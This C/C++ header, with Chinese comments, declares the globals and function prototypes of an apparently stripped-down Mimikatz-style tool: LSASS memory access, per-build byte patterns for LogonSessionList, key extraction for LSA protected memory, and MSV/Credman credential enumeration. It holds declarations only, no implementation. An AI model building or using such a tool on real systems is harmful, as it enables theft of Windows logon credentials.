#include "globals.h"
#include "struts.h"

#ifndef _TEST_H_
#define _TEST_H_
//全局变量注册
extern DWORD MIMIKATZ_NT_MAJOR_VERSION, MIMIKATZ_NT_MINOR_VERSION, MIMIKATZ_NT_BUILD_NUMBER;
extern KULL_M_MEMORY_HANDLE KULL_M_MEMORY_GLOBAL_OWN_HANDLE;
extern KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_msv_package;
extern PKUHL_M_SEKURLSA_PACKAGE lsassPackages[];
extern PLIST_ENTRY LogonSessionList;
extern PULONG LogonSessionListCount;

extern BYTE PTRN_WIN5_LogonSessionList[];
extern BYTE PTRN_WN60_LogonSessionList[];
extern BYTE PTRN_WN61_LogonSessionList[];
extern BYTE PTRN_WN63_LogonSessionList[];
extern BYTE PTRN_WN6x_LogonSessionList[];
extern BYTE PTRN_WN1703_LogonSessionList[];
extern BYTE PTRN_WN1803_LogonSessionList[];
extern BYTE PTRN_WN11_LogonSessionList[];
extern KULL_M_PATCH_GENERIC LsaSrvReferences[];
extern KULL_M_PATCH_GENERIC PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef[];
extern BYTE PTRN_WNO8_LsaInitializeProtectedMemory_KEY[];
extern BYTE PTRN_WIN8_LsaInitializeProtectedMemory_KEY[];
extern BYTE PTRN_WN10_LsaInitializeProtectedMemory_KEY[];
extern BYTE InitializationVector[16]; 
extern KIWI_BCRYPT_GEN_KEY k3Des, kAes;
#endif

//函数注册
VOID qureyProcessId(std::string name, DWORD* pid);
NTSTATUS kuhl_m_privilege_simple(ULONG privId);
void GetSysInfo();
BOOL kull_m_memory_open(IN KULL_M_MEMORY_TYPE Type, IN HANDLE hAny, OUT PKULL_M_MEMORY_HANDLE* hMemory);
BOOL kull_m_process_peb(PKULL_M_MEMORY_HANDLE memory, PPEB pPeb, BOOL isWOW);
BOOL kull_m_memory_copy(OUT PKULL_M_MEMORY_ADDRESS Destination, IN PKULL_M_MEMORY_ADDRESS Source, IN SIZE_T Length);
typedef BOOL(CALLBACK* PKULL_M_MODULE_ENUM_CALLBACK) (PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION pModuleInformation, PVOID pvArg);
void kull_m_process_adjustTimeDateStamp(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION information);
BOOL kull_m_process_ntheaders(PKULL_M_MEMORY_ADDRESS pBase, PIMAGE_NT_HEADERS* pHeaders);
NTSTATUS kull_m_process_getVeryBasicModuleInformations(PKULL_M_MEMORY_HANDLE memory, PKULL_M_MODULE_ENUM_CALLBACK callBack, PVOID pvArg);
BOOL CALLBACK kuhl_m_sekurlsa_findlibs(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION pModuleInformation, PVOID pvArg);
void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_msv(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData);
void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_credman(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData);
BOOL kuhl_m_sekurlsa_utils_search(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib);
BOOL kull_m_memory_search(IN PKULL_M_MEMORY_ADDRESS Pattern, IN SIZE_T Length, IN PKULL_M_MEMORY_SEARCH Search, IN BOOL bufferMeFirst);
BOOL kuhl_m_sekurlsa_utils_search_generic(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib, PKULL_M_PATCH_GENERIC generics, SIZE_T cbGenerics, PVOID* genericPtr, PVOID* genericPtr1, PVOID* genericPtr2, PLONG genericOffset1);
PKULL_M_PATCH_GENERIC kull_m_patch_getGenericFromBuild(PKULL_M_PATCH_GENERIC generics, SIZE_T cbGenerics, DWORD BuildNumber);
NTSTATUS kuhl_m_sekurlsa_nt6_acquireKeys(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION lsassLsaSrvModule);
BOOL kuhl_m_sekurlsa_nt6_acquireKey(PKULL_M_MEMORY_ADDRESS aLsassMemory, PKUHL_M_SEKURLSA_OS_CONTEXT pOs, PKIWI_BCRYPT_GEN_KEY pGenKey, LONG armOffset);
BOOL kull_m_process_getUnicodeString(IN PUNICODE_STRING string, IN PKULL_M_MEMORY_HANDLE source);
BOOL kull_m_process_getSid(IN PSID* pSid, IN PKULL_M_MEMORY_HANDLE source);